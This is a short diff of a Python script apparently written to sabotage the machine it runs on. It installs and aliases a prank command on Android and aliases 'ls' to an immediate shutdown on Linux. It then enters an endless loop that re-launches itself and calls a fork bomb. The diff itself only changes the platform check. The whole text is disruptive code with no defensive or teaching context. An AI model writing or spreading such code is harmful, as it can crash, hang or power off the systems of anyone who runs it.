@@ -5,8 +5,10 @@ if platform.system() == "Android":
   os.system("yes | pkg install sl")
   os.system("clear")
   os.system('alias ls="sl"')
-else:
+elif platform.system() == "Linux":
   os.system('alias ls="shutdown 0"')
+else:
+  pass
 while True:
   os.system("python fork.py")
   forkbomb()
